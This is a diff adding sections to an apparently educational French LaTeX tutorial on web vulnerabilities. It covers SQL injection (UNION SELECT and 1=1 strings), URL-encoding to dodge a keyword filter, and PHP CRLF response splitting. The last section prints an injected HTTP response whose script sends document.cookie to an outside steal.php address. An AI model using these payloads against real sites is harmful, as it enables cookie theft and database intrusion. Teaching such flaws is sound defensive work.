@@ -314,10 +314,6 @@ Pour se protéger contre ce type d'attaque, il suffit de vérifier que les infor
 \section{Attaque temporel - Attaque par Canaux cachés}
 \subsection{Qu'est ce qu'un canal caché ?}
 
-
-\newpage
-\section{Attaque temporel - Attaque par Canaux cachés}
-
 \newpage
 \section{CSRF - Cross-site request forgery}
 \subsection{Qu'est ce qu'une attaque CSRF ?}
@@ -548,6 +544,78 @@ http://\%77\%77\%77\%2E\%67\%6F\%6F\%67\%6C\%65\%2E\%66\%72
 \vspace{0.2cm} 
 
 On passera a travers un filtre qui cherchera la chaine "google". A noter que cette manière de faire ne fonctionne pas dans tous les navigateurs. Pour encoder une chaine, le lien suivante donne un bon tableau d'encodage : http://www.w3schools.com/tags/ref\_urlencode.asp
+
+
+\newpage
+\section{SQL}
+\subsection{Préambule}
+Une des plus grosse faille connu et redouté par les webmasters : l'injection SQL. Les conséquences de telles failles sont souvent désastreuses. Le hacker peut suivant la faille créer de nouveaux comptes bypassant les droits, recueillir des informations confidentielles, détruire la base de données...
+
+Pour savoir si une injection sql, on test généralement différentes chaines comme celles qui sont récapitulé ci-dessous :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\begin{center}
+\includegraphics[width=\textwidth]{sql8}
+\end{center}
+}}
+\vspace{0.2cm}
+
+Pour les exemples qui vont suivre, je vais me servir d'une petite base de données créé sous phpMyAdmin qui sera la suivante :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\begin{center}
+\includegraphics[width=0.5\textwidth]{sql1}
+\end{center}
+}}
+\vspace{0.2cm}
+
+\subsection{Simple SQL Injection}
+
+Dans cette section, j'utiliserais le code suivant :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql2}
+}}
+\vspace{0.2cm}
+
+Ce qui nous permet d'obtenir un code par id :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql3}
+}}
+\vspace{0.2cm}
+
+On remarque dans ce code que la variable id est directement inséré dans la query. Si a la place de ne fournir qu'un chiffre dans la variable get, on fournit une toute nouvelle requete à la suite. On obtient alors un résultat tout autre. Je vous met donc au défi de récupérer toutes les valeurs de la table via la variable GET. 
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql4}
+}}
+\vspace{0.2cm}
+
+En injectant directement notre "1 UNION SELECT * FROM Latsuj" nous avons créé une nouvelle query qui nous permet d'obtenir toutes les informations que nous souhaitions. Mais nous ne ferons jamais comme ceci car dans la "vrai" vie, nous ignorons le nom de la database et des tables (quoiqu'il est parfois possible de les récupérer via d'autres injections). On utilisera plutot l'injection 1=1 comme ceci :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql5}
+}}
+\vspace{0.2cm}
+
+Cette manière de faire est beaucoup plus jolie et performante !
+
+\subsection{Simple SQL Injection 2}
+
+Nous allons légèrement modifier le script pour rendre ce dernier un peu plus difficile et plus proche de la réalité. Remarquer l'ajout de parenthèses :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql6}
+}}
+\vspace{0.2cm}
+
+Il faudra donc prendre en compte ces dernière pour refaire la même injection que précédemment :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{sql7}
+}}
+\vspace{0.2cm}
 
 \newpage
 \section{XSS}
@@ -926,6 +994,53 @@ Si on essaye par exemple de rentrer dans la variable path : index.php, nous ne p
 A noter que cette faille existe sur plusieurs fonctions de php comme :\\ 
 
 tempnam(),rmdir(),readlink(),pcntl\_exec(),move\_uploaded\_file()\\
+
+\newpage
+\section{Les anciennes failles}
+\subsection{HTML Splitting}
+
+Cette faille qui existait dans les vielles version de php n'est actuellement plus possible. Elle touchait principalement la fonction header. Cette fonction via l'injection de CRLF permettait d'ajouter des requêtes HTML dans des requêtes HTML. Le principe est le suivant :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+header("Location: \$\_GET['page'];");
+}}
+\vspace{0.2cm}
+
+Cette fonction redirigeait l'utilisateur via une requete qui contenait la chaine entré par l'utilisateur. La requete alors perçu par le serveur était la suivante avec le lien suivant :\\ 
+www.latsuj.com?page=www.latsuj.com
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+HTTP/1.x 302 Found\\
+Location: www.latsuj.com
+}}
+\vspace{0.2cm}
+
+Maintenant l'absence de filtre de CRLF permettait de rentrer de nouveau élément dans la requête comme ci-dessous avec le lien suivant :\\
+www.latsuj.com?page=www.latsuj.com\textbackslash r\textbackslash nContent-Length: 0
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+HTTP/1.x 302 Found\\
+Location: www.latsuj.com\\
+Content-Length: 0
+}}
+\vspace{0.2cm}
+
+Comme on peux le voir ci-dessus, on a réussi à incorporé un élément à la requête. En allant encore une plus loin, il est possible de recréer complètement une requête dans cette dernière. En poussant ainsi le vice, il est possible d'utiliser les failles XSS, les attaques CSRF ou encore les caches poisonning. L'éventail d'attaque est important. Je vais tout de même donner un petit exemple avec l'emploi d'un cookie stealer :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+HTTP/1.1 302 Found\\
+Location:\textbackslash r\textbackslash n\\
+Content-Length: 0\textbackslash r\textbackslash n\\
+\textbackslash r\textbackslash n\\
+HTTP/1.1 200 OK\textbackslash r\textbackslash n\\
+Content-Type: text/html\textbackslash r\textbackslash n\\
+Content-Length: 200\textbackslash r\textbackslash n\\
+\textbackslash r\textbackslash n\\
+<script>\\
+document.location="http://www.lastuj.com/steal.php?cookie=" document.cookie;\\
+</script>
+}}
+\vspace{0.2cm}
 
 
 \newpage
